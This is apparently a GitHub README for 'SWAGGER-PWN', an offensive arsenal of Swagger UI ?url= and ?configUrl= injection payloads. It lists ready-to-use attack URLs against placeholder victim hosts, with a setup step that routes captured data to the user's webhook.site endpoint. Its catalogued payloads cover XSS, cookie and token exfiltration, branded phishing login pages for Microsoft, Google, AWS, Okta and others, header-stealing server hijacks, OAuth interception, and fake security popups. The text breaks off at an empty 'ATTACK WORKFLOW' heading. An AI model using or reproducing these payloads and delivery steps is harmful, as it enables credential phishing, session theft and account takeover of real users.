# ⚡ SWAGGER-PWN

```
   ███████╗██╗    ██╗ █████╗  ██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██╗    ██╗███╗   ██╗
   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔═══██╗██╔════╝    ██╔══██╗██║    ██║████╗  ██║
   ███████╗██║ █╗ ██║███████║██║     ██║   ██║██║   ██║███████╗    ██████╔╝██║ █╗ ██║██╔██╗ ██║
   ╚════██║██║███╗██║██╔══██║██║     ██║   ██║██║   ██║╚════██║    ██╔═══╝ ██║███╗██║██║╚██╗██║
   ███████║╚███╔███╔╝██║  ██║╚██████╗╚██████╔╝╚██████╔╝███████║    ██████╔╝╚███╔███╔╝██║ ╚████║
   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝  ╚███╔███╔╝██║  ╚███║
```

> **[!]** Swagger UI `?url=` / `?configUrl=` injection arsenal — 68 payloads.
> HTML injection → credential harvesting → cookie capture → OAuth interception → **silent server hijack (auth-header exfiltration)**.

---

## ⚔️ TWO DELIVERY METHODS

### 🅰 Method A — `?configUrl=` (primary — bypasses hardened `?url=` filters)

The UI fetches a JSON config you control; the config points at your payload YAML. Most admins lock `?url=` and forget `configUrl` even exists.

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.json
```

pointer file (`login-office365.json`):
```json
{ "url": "https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.yaml", "urls": [{ "url": "https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.yaml", "name": "login-office365" }] }
```

### 🅱 Method B — `?url=` (direct spec load — legacy / unhardened UIs)

No pointer file needed — load the YAML straight:

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.yaml
```

**Rule of thumb:** fire `?configUrl=` first — it works on hardened AND stock UIs. On ancient versions `?url=` works raw. Every payload ships in BOTH formats: `.json` → configUrl, `.yaml` → url. Just swap the extension.

### 🗺 Path hunting

```
/swagger-ui.html  /swagger-ui/index.html  /swagger/index.html  /swagger/ui
/api-docs  /docs  /api/docs  /webjars/springfox-swagger-ui/index.html
```

---

## ⚙️ SETUP (60 seconds, once)

1. Open **https://webhook.site** → copy your UUID
2. Point every payload at your webhook (placeholder is `webhook.site/REPLACE-ME`):

```bash
git clone https://github.com/RekhanshRajput/Swagger-xss-payloads.git
cd Swagger-xss-payloads
grep -rl "webhook.site/REPLACE-ME" . | xargs sed -i 's|webhook.site/REPLACE-ME|webhook.site/YOUR-UUID|g'
git add -A && git commit -m "hook" && git push
```

3. Done — every credential POST and beacon GET lands in your webhook dashboard. Brand logos + colored buttons (`assets/*.png`) are already hosted in this repo and load from raw.githubusercontent.


---

## 🩸 01 · SANITIZER PROBE — RUN THIS FIRST

| Payload | What it does |
|---|---|
| `probe` | Fingerprint what the target's Swagger UI allows — style attr, tables, images, SVG, forms, iframes. Dump the DOM and see exactly which payloads will fire. Zero guesswork. |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/probe.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/probe.yaml
```

---

## 💀 02 · XSS VECTORS

| Payload | What it does |
|---|---|
| `xss-img-onerror` | img onerror JS execution — classic; fires on legacy UIs, sanitized on modern |
| `xss-svg-animate` | SVG animate xlink:href script vector |
| `xss-svg-xlink` | SVG xlink script vector |
| `xss-mutation-noscript` | DOMPurify mutation XSS via noscript mXSS |
| `xss-mutation-mathml` | DOMPurify mutation XSS via MathML reparse |
| `xss-mutation-style` | style-tag mXSS variant |
| `xss-details-ontoggle` | details/ontoggle event vector |
| `xss-autofocus` | autofocus + onfocus event vector |
| `xss-formaction` | formaction hijack vector |
| `xss-body-embed` | embed/body event vector |
| `xss-marquee-media` | marquee/media event vector |
| `xss-dompurify-probe` | DOMPurify bypass attempts — fingerprint the sanitizer |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-img-onerror.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-animate.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-xlink.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-noscript.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-mathml.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-style.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-details-ontoggle.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-autofocus.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-formaction.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-body-embed.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-marquee-media.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-dompurify-probe.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-img-onerror.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-animate.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-xlink.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-noscript.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-mathml.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-style.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-details-ontoggle.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-autofocus.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-formaction.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-body-embed.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-marquee-media.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-dompurify-probe.yaml
```

---

## 🍪 03 · COOKIE / TOKEN CAPTURE

| Payload | What it does |
|---|---|
| `cookie-img-onerror` | steals document.cookie via onerror JS and exfils to your webhook |
| `cookie-mutation-exfil` | mXSS route to exfil cookies on sanitizing UIs |
| `cookie-authurl-exfil` | exfils grabbed data through Authorization URL parameters |
| `cookie-authurl-domain` | same, scoped for cross-domain exfil |
| `cookie-oauth-lure` | OAuth-flavored cookie capture lure |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-img-onerror.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-mutation-exfil.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-exfil.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-domain.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-oauth-lure.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-img-onerror.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-mutation-exfil.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-exfil.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-domain.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-oauth-lure.yaml
```

---

## 🎣 04 · PHISHING LOGIN PAGES

Branded look-alikes rendered INSIDE the real Swagger UI page. Form `action` → your webhook. **Sanitizer-proof:** built only from elements DOMPurify allows on EVERY version (`<table bgcolor>`, `<font>`, image submit buttons) — legacy UIs render them even better.

| Payload | What it does |
|---|---|
| `login-office365` | Microsoft 365 look-alike — blue brand bar, MS logo, Sign in CTA |
| `login-google` | Google Account look-alike — 4-color logo, Material-style Next |
| `login-aws-console` | AWS console — navy header, aws logo, Account ID + IAM + password |
| `login-github` | GitHub sign-in — octocat, bordered field groups, green CTA |
| `login-okta` | Okta IdP look-alike — ring logo, Partner API Portal |
| `login-cloudflare` | Cloudflare dashboard — dark brand bar, orange CTA |
| `login-slack` | Slack workspace — 4-color hash logo, purple CTA |
| `login-jira` | Atlassian Jira — blue brand bar, Jira logo |
| `login-windows-popup` | Windows Security dialog — title bar, OK button, corp domain |
| `login-vpn-portal` | Cisco AnyConnect — group selector, encrypted-tunnel copy |
| `login-db-admin` | phpMyAdmin 5.2.1 — server pre-filled mysql-db01.internal |
| `login-mfa-otp` | 2FA screen — 6-digit OTP capture with Verify button |
| `login-password-reset` | expired-password reset — old + new password capture |
| `login-api-key` | GitHub-dark 401 screen — API token + email capture |
| `login-sso-corporate` | enterprise SSO re-auth — dark page, blue CTA |
| `login-basic` | Swagger-branded error + login — generic catch-all |
| `creds-mega-form` | all-in-one capture — username + password + API key + 2FA in one red verification screen |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-google.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-aws-console.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-github.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-okta.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-cloudflare.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-slack.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-jira.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-windows-popup.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-vpn-portal.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-db-admin.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-mfa-otp.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-password-reset.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-api-key.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-sso-corporate.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-basic.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/creds-mega-form.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-office365.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-google.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-aws-console.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-github.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-okta.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-cloudflare.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-slack.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-jira.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-windows-popup.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-vpn-portal.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-db-admin.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-mfa-otp.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-password-reset.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-api-key.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-sso-corporate.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-basic.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/creds-mega-form.yaml
```

---

## 📡 05 · BEACONS / DELIVERY CONFIRMATION

| Payload | What it does |
|---|---|
| `img-beacon` | 1x1 pixel + markdown beacon — confirms the payload loaded |
| `img-capture-multi` | multi-marker beacons — confirms full render |
| `img-favicon-beacon` | favicon-link beacon — silent load confirmation |
| `img-overlay` | fullscreen image takeover — visible injection proof |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-beacon.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-capture-multi.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-favicon-beacon.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-overlay.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-beacon.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-capture-multi.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-favicon-beacon.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-overlay.yaml
```

---

## 🧨 06 · SERVER HIJACK — HIGHEST IMPACT

**The bypass that never dies:** the `servers` array is never sanitized. Victim clicks Try-it-out → request goes to YOUR host with full headers.

| Payload | What it does |
|---|---|
| `server-hijack-single` | replaces the API host with your server — every Try-it-out call (WITH auth headers) hits you |
| `server-hijack-multi` | injects attacker host as first of multiple servers |
| `server-hijack-path` | path-based hijack — appends attacker path to the real host |
| `server-hijack-silent` | fully silent hijack — description looks like normal docs, zero visible payload |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-single.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-multi.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-path.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-silent.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-single.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-multi.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-path.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-silent.yaml
```

---

## 🎭 07 · OAUTH INTERCEPTION

| Payload | What it does |
|---|---|
| `oauth-password-flow` | renders OAuth password-grant form — tokens POST straight to your webhook |
| `oauth-redirect-capture` | captures redirect_uri flows through attacker control |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-password-flow.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-redirect-capture.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-password-flow.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-redirect-capture.yaml
```

---

## 🧲 08 · REDIRECTS

| Payload | What it does |
|---|---|
| `redirect-click` | click-triggered open redirect |
| `redirect-meta` | meta-refresh auto-redirect — zero interaction |
| `redirect-window-open` | window.open lure redirect |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-click.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-meta.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-window-open.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-click.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-meta.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-window-open.yaml
```

---

## 🕸️ 09 · HTML INJECTION / DEFACEMENT

| Payload | What it does |
|---|---|
| `html-banner` | full-width injected banner |
| `html-deface-overlay` | fullscreen defacement overlay |
| `html-fake-error` | fake system error page |
| `html-iframe-probe` | iframe injection probe — tests if the UI allows frames |
| `html-marquee` | scrolling marquee defacement |
| `html-table-spoof` | fake data table spoofing real API output |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-banner.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-deface-overlay.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-fake-error.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-iframe-probe.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-marquee.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-table-spoof.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-banner.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-deface-overlay.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-fake-error.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-iframe-probe.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-marquee.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-table-spoof.yaml
```

---

## ☠️ 10 · POPUP DIALOGS — PSYOPS

Fake system dialogs rendered on top of the docs — users interact believing they are real. Pure-HTML modals, work on modern UIs.

| Payload | What it does |
|---|---|
| `popup-alert` | fake security alert modal → 'Continue to Login' |
| `popup-confirm` | 'Are you sure?' confirm dialog — click tracked |
| `popup-cookie-consent` | fake cookie banner — Accept posts to your webhook |
| `popup-session-expired` | 'Session timed out' — re-login capture |
| `popup-update-available` | 'Critical update v4.2.1' — Install click tracked |
| `popup-notification` | browser-style 'new sign-in detected' — Review click |
| `popup-scareware` | 'Access revoked in 10 minutes' panic dialog |
| `popup-captcha` | fake CAPTCHA — solved code captured |
| `popup-download-ready` | 'accounts.csv export ready' — download bait beacon |
| `popup-fullscreen-lock` | fullscreen ACCESS LOCKED screen — page takeover |
| `popup-chrome-update` | fake Chrome update bar — Update click |
| `popup-feedback` | 'Rate this API' widget — input capture |
| `popup-oauth-qr` | fake QR auth modal — 8-digit code capture |
| `beacon-multipixel` | 10 tracking pixels + markdown beacon + rendered banner — maximum delivery telemetry |

**🅰 configUrl delivery:**

```http
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-alert.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-confirm.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-cookie-consent.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-session-expired.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-update-available.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-notification.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-scareware.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-captcha.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-download-ready.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-fullscreen-lock.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-chrome-update.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-feedback.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-oauth-qr.json
https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/beacon-multipixel.json
```

**🅱 direct ?url= delivery:**

```http
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-alert.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-confirm.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-cookie-consent.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-session-expired.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-update-available.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-notification.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-scareware.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-captcha.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-download-ready.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-fullscreen-lock.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-chrome-update.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-feedback.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/popup-oauth-qr.yaml
https://VICTIM/swagger-ui/index.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/beacon-multipixel.yaml
```

---

## 🎯 ATTACK WORKFLOW

```
